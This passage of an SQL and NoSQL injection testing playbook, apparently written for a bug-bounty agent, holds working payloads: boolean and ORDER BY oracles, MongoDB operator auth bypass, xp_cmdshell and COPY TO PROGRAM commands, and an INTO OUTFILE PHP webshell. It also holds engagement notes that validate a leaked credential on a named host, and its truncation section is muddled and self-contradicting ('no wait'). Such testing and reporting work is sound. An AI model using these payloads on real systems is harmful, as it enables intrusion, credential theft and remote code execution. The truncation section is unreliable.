(`{"id": "1' OR '1'='1"}`), XML (`<filter>1' OR '1'='1</filter>`, XXE-adjacent but
SQL-facing), GraphQL (`variables`, `input` objects, aliases) — and the server
deserializes it before concatenating into SQL. Layers shield the payload from naive
WAFs that only inspect query strings, and change *where* the quote must break out of
(the JSON string, the XML text node, the GraphQL literal). The violated assumption:
"body payloads are safe because they're parsed, not built" — parsing happens before
SQL assembly; the parsed *value* is still attacker text.

**Preconditions:**
- The value inside the structured container reaches a string-concatenated SQL sink (V-01/V-02/V-03 mechanisms all apply once inside).
- Transport parsing is attacker-influencable: content-type sniffing (`Content-Type: application/json` with form body), JSON type confusion (`{"id": {"$gt": ""}}` — V-13), XML entity expansion off the SQL path.
- GraphQL resolvers often map input directly to ORM filters → high-value targets.

**Detect:**
1. Identify transport: `Content-Type` + body shape. Then probe *inside* the container: JSON `{"q": "'}` (quote inside the value, not the raw body), XML `<q>'</q>`, GraphQL `{"query":"query($q:String){ search(q:$q){ id } }","variables":{"q":"'"}}`.
2. Type-confusion probe (JSON): send `{"q": {"x": 1}}` where a string was expected. Different error (parser vs SQL) tells you whether the deserializer or the query layer rejects it.
3. Escalate the inner value: `{"q": "' AND 1=1-- "}` → boolean flip in the GraphQL/REST result set (V-03 method).
4. XML angle: inject inside a *text node*, not an attribute (`<q>'</q>` vs `<q x="'>`); if the parser resolves entities, check whether entity content reaches SQL (rare, but read-side XXE + SQL combos exist).
5. GraphQL-specific: batch aliases (field-name collision abuse only helps BAC — for SQLi keep to value injection), introspection to find filter args, and `variables` (typed `String`/`Int` may coerce — try `String!` with a quote, `Int` with `-1 OR 1=1` to see coercion errors).

**Proof of concept:**
- JSON boolean: `POST /api/search` `{"Content-Type": application/json"}` body:
  `{"filter": "' OR '1'='1'-- "}`
- JSON type-confusion (numeric field): `{"id": "1 OR 1=1"}` and `{"id": ["1"," OR 1=1"]}` (array where scalar expected).
- XML: `<search><term>' UNION SELECT 1,2,3-- </term></search>` (raw body with `application/xml`).
- GraphQL: `{"query":"query($f:String!){ items(filter:$f){ name } }","variables":{"f":"' OR '1'='1'-- "}}`
- Content-type flip: send the JSON body as `application/x-www-form-urlencoded` if the server sniffs — payload may reach a different parser that is less strict.

**Confirm:** The *inner* value alone drives the effect: swap only the value (true →
false condition) while keeping container shape identical and observe the response
flip (V-03) or delay (V-04). Independent second signal: same inner payload works
through a *different* transport (REST JSON and its GraphQL equivalent) — same sink,
two doors.

**False positives:** Parser rejecting malformed JSON/XML *before* SQL (generic 400s
mislabeled as injection); GraphQL field errors unrelated to your value (validation
layer, not DB); JSON `{"$gt":...}` handled by an ORM as an *operator* (that's V-13
NoSQLi, not SQLi — different CWE, report it as NoSQLi); XML parser XXE/network
errors being reported as SQLi; and reflection of the JSON body back in an error
("invalid query at position N" echoing your quote) — echo ≠ execution. Juniors
also forget that a JSON string literal requires escaping internal quotes as `\"`
when the payload itself embeds quotes — the WAF may see a *different* string than
the one the app parses.

**Impact:** Evasion-flavored reachability: reaches sinks that query-string scanners
miss, often on API endpoints with high data density (GraphQL `items(filter:)`,
JSON `filter`/`sort` args); report the transport + sink pair; severity from data
reachable behind auth.

**Remediation:** Parameterize after deserialization (binding applies to parsed
values too); validate/allow-list GraphQL/JSON filter enums server-side; never pass
raw transport strings into query builders.

**CWE / OWASP:** CWE-89 (structured transports don't change the sink) — OWASP A03:2021; WSTG-INP-04 (+ WSTG-ERR-03/XXE adjacency where XML is parsed).

## [Bugbountyskills.md] >> sqli-testing — variants-2.md (variant playbook)

*Source: `/root/Myskill/sqli-testing/references/variants-2.md`*

## [Bugbountyskills.md] sqli-testing — Variants 9-15 (references/variants-2.md)

Deep playbook, second half: structural manipulation, DB-specific command execution,
WAF impedance mismatch, polyglot evasion, NoSQLi, truncation, and second-order blind
extraction. Cross-cutting notes (headers, encodings, logical operators, obfuscation,
blind OOB HTTP/SMB) are collected at the end of this file; encoder tables and tool
templates live in `payloads.md`. Same guardrail as everywhere: read-only proofs,
never destructive or DoS-shaped payloads against third-party targets.

## [Bugbountyskills.md] V-09: Structural query manipulation via ORDER BY, GROUP BY and LIMIT/OFFSET exploits

**Mechanism:** The attacker controls *query structure*, not just values: the sort
column, grouping key, page size, and offset. These slots take identifiers/literals
rather than bound parameters — apps build `ORDER BY ${col} ${dir}` from request
input — so injection lands where no quote-breakout is even needed (numeric/identifier
context), and `CASE WHEN`-based conditional sorting gives a blind oracle without
ever showing data. The violated assumption: "ORDER BY only reorders rows, so it's
harmless."

**Preconditions:**
- Request exposes sort/filter/pagination params (`sort`, `order`, `order_by`, `dir`, `limit`, `offset`, `page`, `size`, `groupBy`, sometimes nested like `sort[field]`).
- Values interpolated into the SQL string (allow-listed enums are safe; string-built is not).
- For blind use: the response shows row order/page content stable enough to compare.

**Detect:**
1. Probe `ORDER BY` position with column count: `sort=id` → `sort=zzz` → `sort=id,random()`... errors or 500s on `zzz` mean the identifier reaches SQL unquoted.
2. Confirm identifier injection: `sort=id AND (SELECT 1)=1` vs `sort=id AND (SELECT 1)=2` (numeric/`AND` forms), or in a quoted identifier context `' OR '1'='1`.
3. Conditional-sort oracle (the powerful one): MySQL
   `sort=(CASE WHEN (ASCII(SUBSTR((SELECT ...),1,1))=97) THEN id ELSE email END)` —
   watch which column the rows sort by. Postgres/MSSQL allow `ORDER BY CASE WHEN`.
4. Group/HAVING: `groupBy=<col>` → try `groupBy=col HAVING 1=1-- ` or
   `groupBy=col,version()`; column-count errors leak group shape.
5. LIMIT/OFFSET numeric slot: `limit=1` → `limit=1;SELECT ...` (V-06), `limit=IF(1=1,1,0)`, or MySQL `limit 1 PROCEDURE ANALYSE()`-style legacy tricks; offset pagination abuse
   (`offset=-1`) is more BAC — report it to `bac-idor-testing` if it exposes others' rows.

**Proof of concept:**
- Identifier error probe: `GET /api/products?sort=<PLACEHOLDER>` with `sort=zzz`, `sort=id DESC`, `sort=id,(SELECT 1)`.
- Conditional sort (MySQL): `sort=(CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE id=1),1,1))=97) THEN name ELSE category END)`
- Blind via page contents: `sort=id AND IF(ASCII(SUBSTR(<subquery>,1,1))=97,1,(SELECT 1 UNION SELECT 2))` (row-vs-error flip is a second oracle shape).
- LIMIT stack (only if V-06 applies, read-only second statement): `limit=1;SELECT CASE WHEN <cond> THEN SLEEP(2) ELSE 0 END-- `.

**Confirm:** Structure-driven A/B: same request, only the sort/limit token changes →
observable reordering, pagination shift, or error that tracks the token's truth.
Second signal: a `CASE WHEN` sort whose ordering matches an *independently known*
ground truth (you know row A > row B), proving the comparison executed.

**False positives:** Client-side sorting (JS re-sorts the table — check the raw API
response, not the rendered grid); stable ordering that's just `ORDER BY id` default
appearing "controlled"; errors from unknown identifiers that are really app-side
enum validation (validation error ≠ SQL error — read the error class); pagination
counters changing length so "boolean flips" are just off-by-one display; and
`LIMIT`/`OFFSET` params being validated as ints — a 400 there is not a finding.
Also: `random()`/`newid()` sorts make *every* comparison look non-deterministic —
retest with a deterministic tiebreaker before claiming an oracle.

**Impact:** Identifier-context injection often bypasses WAFs tuned for quote
breakouts (V-11 synergy); conditional sorting yields a silent data oracle; LIMIT
control can expose hidden pages. Report which structural slot + which oracle.

**Remediation:** Allow-list sort columns and sort directions server-side (map API
names → fixed SQL identifiers); cast `limit`/`offset` to int; never interpolate
identifiers from request data.

**CWE / OWASP:** CWE-89 (+ CWE-639 adjacency for offset paging) — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] V-10: Database-specific command execution (MySQL INTO OUTFILE/LOAD_FILE, MSSQL xp_cmdshell, PostgreSQL COPY TO/FROM PROGRAM, Oracle UTL_HTTP/SYS.DBMS, SQLite)

**Mechanism:** Each DBMS ships file/shell-adjacent primitives the app's DB role may
be allowed to reach — and SQL injection is the delivery vehicle. MySQL
`SELECT ... INTO OUTFILE`/`LOAD_FILE`; MSSQL `xp_cmdshell`, `sp_configure`,
`OPENROWSET`, `CLR`; Postgres `COPY ... TO/FROM PROGRAM`, `lo_import`, `dblink`;
Oracle `UTL_HTTP`, `DBMS_SCHEDULER`, `SYS.DBMS_*`, external tables; SQLite
`load_extension`, attach-based file read/write. The violated assumption: "the app
user is least-privilege" — shared-hosting DBs and default installs often are not.
This is the SQLi→RCE/file bridge, so it overlaps `rce-testing`.

**Preconditions:**
- Fingerprinted DBMS (V-01) + known privileges (MySQL `FILE`, MSSQL sysadmin, Postgres superuser/`pg_execute_server_program`, Oracle `CREATE JOB`/network packages).
- Writable web-reachable path known for the outfile→shell step (upload dir, `/var/www/html` guesses) — *in authorized labs only* for the write proof.
- Stacked queries (V-06) for statements that must run as their own command; some primitives work inline in a `SELECT`.

**Detect:**
1. Fingerprint + privilege read first (read-only): MySQL `SELECT file_priv FROM mysql.user WHERE user=current_user()` — or simply test `LOAD_FILE('/etc/passwd')` *only if the program permits file reads*; otherwise use `LOAD_FILE` on a file you own/know. Postgres `SELECT current_setting('is_superuser')`. MSSQL `SELECT is_srvrolemember('sysadmin')`.
2. File-read capability check (safe shape): MySQL `' AND LOAD_FILE(CONCAT(CHAR(47),...))-- ` or read a known app file (`composer.json`, `package.json`) — content you can verify = real capability.
3. Command channel check (no destructive effect): MSSQL `' AND 1=(SELECT TOP 1 1 FROM OPENROWSET('SQLNCLI','server=(local)', 'EXEC master..xp_cmdshell ''whoami'''))-- ` shape, or via stacked `'; EXEC master..xp_cmdshell 'whoami'-- `; Postgres `COPY (SELECT 1) TO PROGRAM 'id'`-shaped *read-only* command; Oracle `UTL_HTTP.REQUEST('http://<your-oast>')`.
4. Never probe with `rm`, `format`, `del`, fork bombs, or heavy loops. `whoami`, `id`, `hostname` only — capability proof, zero impact.
5. Where a primitive writes files, defer the write proof to your own lab/instance; on bounty targets prove reachability (privilege + path writable errors) without dropping a shell.

**Proof of concept (read-only / lab-write):**
- MySQL read: `' UNION SELECT LOAD_FILE('/var/www/html/composer.json')-- ` (needs `FILE` + `secure_file_priv` check); outfile (lab): `' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/upload/x.php'` — lab only, note the guardrail in your notes.
- MSSQL: `'; EXEC master..xp_cmdshell 'whoami'-- `; then `sp_configure 'xp_cmdshell',1` only if already enabled — *never* `RECONFIGURE`-flip features on third-party targets beyond what's needed to observe the state; report the config state instead.
- Postgres: `'; COPY (SELECT 1) TO PROGRAM 'id'-- ` (superuser-only); file path:
  `COPY users TO '/tmp/out.csv'` → lab only.
- Oracle: `' AND UTL_HTTP.REQUEST('http://<nonce>.<your-oast>.com/') IS NOT NULL-- ` (network proof, no write) or `DBMS_SCHEDULER` job creation → lab only.
- SQLite: `'; ATTACH DATABASE '/tmp/x.db' AS p;-- ` (lab file write) / `load_extension` on a crafted `.so` → lab only.

**Confirm:** Capability, not destruction: (a) a *read* primitive returns verifiable
file content or env data, or (b) a command returns `whoami`/`id` of the service
account, correlated with your request (OAST nonce for Oracle/HTTP paths), 3/3 runs.
Second signal: privilege query (`is_srvrolemember`, `file_priv`, `is_superuser`)
agreeing with the observed capability. No files left behind on third-party targets.

**False positives:** `LOAD_FILE` returning `NULL` (not errors) means blocked —
`NULL` is *not* a file read; `INTO OUTFILE` failing on path/permission errors proves
*attempt*, not capability — report as "restricted"; `xp_cmdshell` returning the
command's error text because it's *disabled* (the error says so) — that's a
hardening observation, not RCE; `whoami` output matching your *own* machine because
the callback came from your client (confirm source is the DB host); and `COPY
PROGRAM` requiring superuser — a plain error means you lack privilege, don't push.
Juniors also confuse OAST *network* proof (V-05) with command execution proof — keep
them separate in the report.

**Impact:** Highest-severity class: file read → config/credential theft
(chain `info-disclosure-testing` for `.env`), file write → webshell (RCE — chain
`rce-testing`), shell → pivot. Severity depends on DB privileges + path
exposure; state auth level and exact privilege in Impact; always note read-only
proof was used.

**Remediation:** Least-privilege DB accounts (no `FILE`/sysadmin/superuser for app
users), disable `xp_cmdshell`/`COPY PROGRAM`/network packages at the server,
parameterize queries (the delivery vector), web-root outside DB write paths.

**CWE / OWASP:** CWE-89, CWE-250/CWE-269 (privilege), CWE-78 adjacency — OWASP A03:2021 + A05:2021 Misconfiguration; WSTG-INP-04.

---

## [Bugbountyskills.md] V-13: NoSQL injection (NoSQLi) document extraction via operator substitution ($gt, $ne, $regex) including HTTP-parameter/JSON-operator injection

**Mechanism:** Document stores (MongoDB via Mongoose/express-mongo, DynamoDB
filters, CouchDB/Pouch, Firestore-ish query builders) accept *structured operators*
as query values. If the app forwards request fields into a filter without
type-checking, the attacker replaces a scalar with an operator object —
`{"username": {"$ne": ""}}`, `{"password": {"$regex": "^a"}}` — turning equality
into logic: authentication bypass, filter bypass, and *regex-based blind extraction*
(one `^ab` probe per char). HTTP form params make this worse: `username[$ne]=` is
parsed by qs/php into `{"username": {"$ne": ""}}` with no JSON body at all. The
violated assumption: "the value is a string because the form said so."

**Preconditions:**
- Backend is a document store (or an ORM that maps dicts → query operators), reachable via JSON body, form params with bracket syntax, GraphQL input, or query-string `$`-keys.
- App passes request values into `$find`/filter without `typeof === 'string'` checks.
- For extraction: a comparator operator (`$regex`, `$gt`, `$lt`) can be pointed at stored fields of *your own* record (guardrail: extract only data you own or aggregate proof like "a user with role admin exists").

**Detect:**
1. Fingerprint: responses shaped like Mongo docs (`_id`, `$oid`), `ObjectId(...)` strings, errors (`CastError`, Mongo `BSONError`, `E11000`), or a `mongodb://` string in verbose errors. Dynamo: `FilterExpression`/`ScanIndexFamilies` errors.
2. Scalar → operator swap: baseline `{"user":"admin","pass":"secret"}` → `{"user":"admin","pass":{"$ne":""}}`. Login/result-set *change* (200 vs 401, rows appear) = operator reaches the filter.
3. Type swap: `{"id": 1}` → `{"id": {"$gt": 0}}` → `{"id": ["1","2"]}` (array) — different reactions reveal the coercion layer.
4. HTTP-parameter variant (no JSON): `POST user=admin&pass[$ne]=` or `?id[$gte]=1` (qs in Express; PHP `$_GET` bracket parsing). Also try `id[$regex]=^1`.
5. Blind extraction ladder: `{"name":{"$regex":"^a"}}` → flip `$regex` value while watching result counts; `^`-prefix per character (V-03 logic, document syntax).
6. Injections *inside* stored strings for second-order NoSQLi (rare, JS-eval contexts → that's `rce-testing`/CSTI territory — don't conflate).

**Proof of concept:**
- Auth bypass: `POST /login` `{"username": "admin", "password": {"$ne": ""}}` → `<PLACEHOLDER: success signal — 302/200 with session>`
- Blind extraction (own record or aggregate proof):
  `{"username": {"$regex": "^adm"}}` vs `{"username": {"$regex": "^adX"}}`
- Form-param form: `username=admin&password[$ne]=1` (`Content-Type: application/x-www-form-urlencoded`, qs-parsed).
- Projection abuse (Mongo `$where`-adjacent only if reachable): `{"$where": "this.password.match(/^a/)"}` → JS engine → high impact, chain note to `rce-testing`.
- ReDoS note: heavy `$regex` against large collections can DoS the DB — use tiny anchored patterns, never nested quantifiers on third-party targets.

**Confirm:** Two signals: (a) operator flip changes the response while the *scalar
equivalent* doesn't (i.e. `{"$ne":""}` ≠ `{"pass":"whatever"}` behavior), and
(b) ground-truth match — `$regex` ladder reproduces a value you already know (your
own username's first char), 3/3. If auth-bypass: confirm you can do *only* what
your session proves, no data beyond scope.

**False positives:** Express `qs`/PHP bracket parsing *failing* and the app
defaulting to "empty filter" → everything returns rows → looks like `$ne` worked
when no operator was even parsed (check with a *malformed* operator like
`{$unknown:1}` — if it also returns rows, the filter was dropped, not injected);
frameworks that stringify `{"$ne":""}` to `[object Object]` and compare literally
(that's a type error, not a bypass); login returning 200 with an error body on
*both* branches (compare actual session issuance, not status code); DynamoDB
`$ne` simply not existing (it's Mongo syntax — Dynamo uses `<>`/`NE`) so a "no
change" ≠ blocked; and rate-limit/CSRF noise on result counts (V-03 FP rules apply).
Also: `$regex` matching across *many* documents and returning the same count for
both probes → your probe hit a non-unique field; test uniqueness first.

**Impact:** Auth bypass (session you shouldn't have — report severity by role
reached), blind read of stored documents (emails, tokens — own/aggregate only for
proof), enumeration of whether an admin account exists (`$regex` on usernames).
Report operator used + auth level; CWE differs from SQLi — keep it in the NoSQL
line.

**Remediation:** Type-check every filter value (`typeof === 'string'` + length cap)
before building queries; strip `$`-prefixed keys server-side (deny-list of
operators) or map explicit DTO fields; parameterize/whitelist document queries.

**CWE / OWASP:** CWE-943 (Improper Neutralization of Special Elements in Data Query
Logic) — OWASP A03:2021; WSTG-ATH-*(NoSQL auth bypass)/WSTG-INP-04.

---

## [Bugbountyskills.md] V-14: Truncation-based SQL injection via database field length limits

**Mechanism:** A column (or input buffer) accepts N characters and silently
*truncates* the (N+1)th — in MySQL non-strict mode with `CHAR(n)`, the trailing
`' -- ` comment is cut off while the quote *before* it stays, leaving live SQL
syntax... no wait, the exploit direction: the app validates the *whole* input
(password policy: contains `--`? rejected) but the DB stores only the first N chars,
so a payload like `<N chars>'--` survives truncation with the trailing comment
*stripped or kept* depending on where the cut lands. Classic cases: a username
validated to max 32 chars, `VARCHAR(32)` truncating `admin'+payload...`, and
registration where `user='aaaa...(pad)' OR 1=1--` is cut so the stored value
becomes a syntactically live injection when later concatenated (feeds V-07/V-15).
The violated assumption: "length limits are a safety control."

**Preconditions:**
- A field with a hard length cap: DB column (`CHAR(n)`/`VARCHAR(n)`) or app input limit *smaller than* the validation/boundary logic accounts for.
- Silent truncation (MySQL non-strict `sql_mode`, some ORMs) rather than an error.
- A place where the truncated value is *re-used in SQL* (second-order) or where the truncation defeats a boundary check (e.g. strips a trailing quote/comment, or cuts a `>= min length` validator while keeping an injected prefix).

**Detect:**
1. Map the boundary: send inputs of length n-1, n, n+1 to the field; observe accept/reject/echo. Note where the *stored* value (not the response echo) differs from what you sent — read it back from a display page (V-07 setup).
2. Probe for silent truncation: store a 40-char marker in a 32-char field, then fetch the row (profile view, admin list, export) — marker cut at 32 with no error = silent truncation.
3. Craft the cut: put the payload so the *dangerous* characters land inside the kept window and the disallowed/trailing characters land outside — e.g. field limit 32: `' OR '1'='1` padded to exactly the boundary so whatever follows is discarded.
4. Check `sql_mode` indirectly: MySQL errors on strict truncation (`Data too long`) → not this variant; silent accept → candidate.
5. Chain check: does the stored (truncated) value get concatenated into a later query (V-07/V-15)? That's where truncation becomes injection.

**Proof of concept:**
- Boundary map: `POST /register` with `username` length 31/32/33 (`<PLACEHOLDER: field, limit>`) → observe stored echo.
- Truncation-viable payload (limit 32 example):
  `username = "' OR '1'='1'-- ` padded so cut occurs after the comment marker, or the inverse: pad so the *validator-visible* tail differs from the *stored* head.
- Validation-defeat (policy "no quotes"): quote accepted because... (this needs the *opposite* trick: put forbidden chars past the limit? validators run pre-truncation — so instead ensure DB-side truncation removes the *sanitizer's* appended guard, e.g. app appends `-- safe` marker then truncates the marker away — document the actual observed behavior).
- Second-order: store `aaa...(exact limit)` ending mid-string so the next query sees an unterminated quote → then trigger the consumer (V-07 steps).

**Confirm:** Two-part proof: (a) stored value ≠ sent value, cut exactly at the known
limit (read-back evidence), and (b) the *truncated* form changes query behavior at
the consumer (boolean flip / error / delay that does *not* occur with the untruncated
input). That "only the truncated version fires" A/B is the second signal.

**False positives:** Normal length validation rejecting n+1 (that's validation
working, not truncation — you need the value to be *stored cut*); client-side
max-length silently stopping input (check the raw request actually sent n+1);
response echo truncating for *display* while the DB stored the full string (display
limits ≠ DB limits — read back from an independent surface); MySQL strict-mode
errors misread as "boundary injection"; and second-order breakage caused by a
sanitizer mid-string cut rather than SQL (V-07 FP rules: confirm SQL-shaped
effect). Juniors also cut at the wrong byte — test the exact limit with a ruler
pattern (`0123456789...`).

**Impact:** Converts strict inputs (length caps, "sanitized" fields) into injection
sinks; often lands in second-order/admin paths (V-07 chain) so it can be high
severity; report the exact limit, cut position, and the consumer query's behavior.

**Remediation:** Enforce limits *consistently* (validate and reject, never silently
truncate) and parameterize the consuming query — truncation stops being a security
concern once values are bound as data.

**CWE / OWASP:** CWE-89 (via CWE-170/CWE-128-style truncation) — OWASP A03:2021; WSTG-INP-04.

---

## [Bugbountyskills.md] >> sqli-testing — core black-box scanning methods (book extract: Degerman & Dubrefjord, Chalmers 2021)

*Source: "Modular Blackbox SQL Injection Vulnerability Web Scanning", Miriam Degerman &
Dennis Dubrefjord, Chalmers University of Technology MSc thesis, 2021 —
`https://odr.chalmers.se/server/api/core/bitstreams/74ddc87e-19b7-4520-a89e-fb2c5c67d83c/content`
(fetched 2026-10-30). Extracted: the attack taxonomy (Doupé et al. + Clarke for OOB), the
node-driven scanning method (ModuleMatcher/Blackmap), scanner failure modes *proven with
Xdebug coverage data*, and detection-reliability caveats. This is the **method layer**
under the V-01..V-15 playbook — it tells you what to reach, what order to test in, and
what makes scanners (including yours) silently miss bugs.*

## [Bugbountyskills.md] Core black-box SQLi methods (book extract)

## [Bugbountyskills.md] dirsearch, ffuf, nmap, sqlmap, nuclei, amass, masscan

### [Bugbountyskills.md] Example: SQLi on login form

```
Control:    {"email":"test@test.com","password":"test"}      → 040006 "login fail" (WAF active)
Test:       {"email":"test@test.com","password":"' OR '1'='1"} → 040006 "login fail" (WAF blocked)
Conclusion:  WAF is functioning. NO SQLi vulnerability.
```

## [Bugbountyskills.md] SQL Injection

<!-- exact-duplicate entries folded in: 1 -->

### [Bugbountyskills.md] C. SQL Injection

- UNION-based SQL injection.
- Boolean-based blind SQL injection.
- Error-based SQL injection.
- Time-based blind SQL injection.
- Stacked queries where applicable.
- Injection in filters, sorting, search, identifiers, JSON fields, and secondary endpoints.

Understand database-specific behavior, query construction, parameterization, response differences, timing noise, and false positives.

Prefer controlled, low-impact validation. Never dump production databases or retrieve unrelated users' records.

## [Bugbountyskills.md] Session-2 follow-up (2026-10-25): F-01 validated, RCE + SQLi investigated

- **F-01 VALIDATED:** leaked `prodhub` credential is real — authenticates to
  `telemetry2.devolutions.net:9200` (OpenSearch + security plugin), 403 with
  `backend_roles=[]` on every capability probe (`_cluster/health`, `_cat/indices`, `_nodes`).
  Inert account → severity dropped Medium→Low. No data read.
- **RCE "sandbox" = FALSE LEAD (unauth).** 645 `powershell` + 2323 `terminal` + 482 `wasm`
  refs are: (1) RDM **client-side connection-launch metadata** (`*EmbeddedPowerShellScript`,
  `ExecutionPolicy`, `Invoke-Expression` in XML connection templates — executes on the
  CUSTOMER's machine when they open a connection, by design), and (2) bundled node_modules
  `new Function(` in `web-ssh-gui` / `web-terminal-gui` / `iron-remote-desktop-vnc` /
  `jszip` / `picky` — **browser-side** remote-session rendering engines. NO server-side
  exec/SQL surface in client source (no child_process/spawn; SqlServer/Dapper/Postgres hits
  are node_modules). Requires an authenticated session + real target to even reach, and
  executes on the RDM client, not the Hub server. Not a server RCE.
- **SQLi = NOT FOUND (unauth).** sqlmap level1/risk1 on the only reachable unauth 200
  endpoint (`/api/server-configurations`) → "all tested parameters do not appear injectable".
  nuclei sqli/injection templates (high+crit) → 0 confirmed. Manual time-based differential
  on `POST /api/searches/entries` (`SLEEP(5)`) → payload 0.14s vs baseline 0.29s (no delay;
  and the route 401s unauth anyway). All real data endpoints are auth-gated (401 empty).

## [Bugbountyskills.md] SQL / NoSQL injection (`sqli-testing`)

| Endpoint | Param | Signal | Status |
|---|---|---|---|
| `GET /api/proxy/products/getAvailabilitiesByProduct` | **`productCode`**, `startDate`, `endDate` | best unauthenticated input, string-concat feel | **Inconclusive** — see below |
| `GET /api/proxy/products/datedPrices` | `startDate` | date parse | 200 baseline; `'` → 403 (bot, not WAF) |
| `GET /api/proxy/products/prices` | `productCode,startDate,endDate` | filter | 200; `?x=1'` → 200 (param ignored) |
| `GET /api/proxy/admin/orders` | **`orderBy`, `columnToFilter`, `columnToSearch`, `search`, `status`** | **ORDER BY / column-name injection — classic, and these are built into the query string** | 401 (needs Okta token) |
| `GET /api/proxy/user/checkEmail` | `email` | string input | probe queued |
| `GET /api/proxy/payment/getUrl` | `paymentRef` | ref lookup | probe queued |

**Why inconclusive:** quote payload produced a `503` that was an *edge-cached* maintenance page
(`cdn-cache: HIT`, `AkamaiNetStorage`), and every follow-up — **including the benign control
`A01WX`** — 403'd at the edge in <0.3s. That is bot throttling, not injection blocking. Re-run
with ≥35s spacing (next session #2).

## [Bugbountyskills.md] 3. SQLi on /help?search (boolean oracle exists: 20 vs 0 article links)

```
input                                code  articles  time    error
laptop                               200   20        0.30s   no
aptop (substring)                    200   20        0.15s   no
%                                    200   20        0.19s   no   <- wildcard honoured
_                                    200   20        0.18s   no   <- wildcard honoured
laptop% | %laptop% | laptop_         200   20        ~0.2s   no
' OR '1'='1                          200   0         0.13s   no
%' OR '1'='1                         200   0         0.12s   no
laptop'--                            200   0         0.12s   no
laptop' AND '1'='1                   200   0         0.19s   no
laptop'||'x                          200   0         0.13s   no
laptop' AND pg_sleep(3)--            200   0         0.14s   no
laptop' AND SLEEP(3)--               200   0         0.17s   no
laptop'; WAITFOR DELAY '0:0:3'--     200   0         0.13s   no
laptop') OR 1=1--                    200   0         0.23s   no
```
No 5xx, no SQLSTATE/PG::/MySQL text, no timing delta ⇒ bound/escaped. `%`/`_` treated as
LIKE wildcards (`sanitize_sql_like` not applied) — searchable public content only.

### [Bugbountyskills.md] 17.2 MongoDB operator injection in the access_token query parameter — unauthenticated auth bypass → admin

SOURCE: HackerOne #3564655 — Rocket.Chat, "Complete authentication bypass to admin permissions" (CVE-2026-29198, CVSS 9.8, Critical, disclosed 2026-04-22)  read 2026-11-07
CLASS: NoSQL injection → authentication bypass (CWE-943 / CWE-287)
CORE METHOD:
  1. Find any REST/API endpoint that accepts the session token as a QUERY parameter rather than a header — `?access_token=`, `?token=`, `?authToken=`, `?api_key=`.
  2. Replace the scalar value with a MongoDB operator object: `?access_token[$ne]=null`, `[$gt]=`, `[$regex]=^`, `[$exists]=true`.
  3. If the parsed query object is passed straight into `findOne({accessToken: <object>})`, the operator matches the FIRST token row in the DB, authenticating you as that user (first OAuth/service user is often admin).
  4. Escalate: hit an admin-only endpoint (`/api/v1/users.list`, settings, roles) with the injected token still in the query string.
DETECTION SIGNAL: Express/Node + MongoDB stack (Rocket.Chat, LoopBack, Parse-style, `qs`-parsed query). Sending `access_token[x]` changes behaviour vs a plain bogus value; a 200 where 401 is expected; error text mentions "access token" even with no token sent.
CHAIN: no credentials → `[$ne]=null` matches the first token → authenticated session → admin API reachable → full instance takeover.
TRANSFERABLE TEST: For every token-in-query-string endpoint send `param%5B%24ne%5D=null` and compare to the `param=garbage` control; a 200/authenticated response against a 401 control confirms it. Also try array pollution `param[]=`.

<!-- exact-duplicate entries folded in: 1 -->

### [Bugbountyskills.md] 17.4 WordPress REST batch endpoint route-dispatch desync → unauthenticated blind SQLi (string where an array is expected)

SOURCE: HackerOne #3873072 — Essity, "Unauthenticated SQL Injection via REST Batch Route Confusion" (CVSS 9.3, Critical, disclosed 2026-07-21; WordPress 7.0 / 6.9.x / 6.8.x)  read 2026-11-07
CLASS: SQL injection (unauthenticated) + request-routing/parser desync (CWE-89 / CWE-436)
CORE METHOD:
  1. Fingerprint WordPress: `GET /feed/` → `<generator>https://wordpress.org/?v=X.Y</generator>`; `/wp-json/` present.
  2. Structural probe — POST to `/wp-json/batch/v1` (or `/?rest_route=/batch/v1`) with a NESTED batch: a sub-request path that fails `parse_url()` (e.g. path `":"`) is NOT pushed into the internal `$matches` array while the dispatch loop still increments its index → sub-request N executes with the handler registered for N+1 (handler shift / route confusion).
  3. Exploit the shift: make `GET /wp/v2/categories?author_exclude=<PAYLOAD>` run under the posts-query handler. `WP_Query` only checks `if (! empty($q['author__not_in']))` and skips the per-element `absint()` cast when the value is a STRING, so the raw string lands in `AND wp_posts.post_author NOT IN ( <attacker> )`.
  4. Confirm with a time oracle: `author_exclude=1) OR SLEEP(0.01)-- -` (the `1)` closes the IN-list). Baseline `1` ≈ 0.5s vs `SLEEP(0.01)` ≈ 9s (≈860 rows × 0.01s) — per-row multiplication proves in-result-set evaluation.
  5. Escalate read: error/UNION over `wp_users` (hashes), `wp_usermeta` (session tokens/app passwords), `wp_options` (secrets); with MySQL `FILE` privilege → `SELECT … INTO OUTFILE` at the webroot → RCE.
DETECTION SIGNAL: `POST /wp-json/batch/v1`; a NESTED `responses` envelope in the reply with `parse_path_failed` markers proves the desync; unpatched `WP_Query` accepts a non-array `author__not_in`/`author__in` (also try `include`, `exclude`, `post__in`).
CHAIN: unauth batch request → handler-index desync → string slips past `absint()` → blind SQLi → wp_users hashes / session tokens / wp_options secrets → admin ATO; +`INTO OUTFILE` → RCE.
TRANSFERABLE TEST: POST a nested batch envelope with a failing path (`":"`) and see whether the response is batch-inside-batch; if so, drive any WP `*__in`/`*__not_in` param with a string SQL payload and time it with `SLEEP`. Generalised: any framework with a batch/aggregate endpoint (Drupal JSON:API, Rails multi-fetch, GraphQL batching) can have a dispatch-index desync → parameter-type confusion.

<!-- exact-duplicate entries folded in: 1 -->

### [Bugbountyskills.md] 17.16 Array-typed parameter (x[]) as a blind-SQLi sink on legacy report/export endpoints (Valve report_xml.php)

SOURCE: https://hackerone.com/reports/383127  2026-11-07
CLASS: blind SQL injection via array-typed parameter (CWE-89) — Valve report_xml.php
CORE METHOD:
  1. Entry point: `partner.steampowered.com/report_xml.php` (legacy PHP partner reporting/export page).
  2. Injectable parameter is ARRAY-typed: `countryFilter[]`. Array form changes how the value is interpolated into SQL (IN-list / `implode` / quote context) and lets it slip past scalar-input assumptions — that array shape is the crux.
  3. Class confirmed BLIND SQLi (boolean/time-based) by the reporter; extraction read "certain SQL data from a single backing database".
  4. An Akamai WAF fronted the endpoint — reporter's note: "Blind SQL Injection && Akamai WAF Bypass". The exact bypass is NOT disclosed on the page (report body withheld; do not invent it).
Vendor: "An unvalidated parameter on a partner reporting page (report_xml.php) could be used to read certain SQL data from a single backing database." Critical 9.9, $25,000.
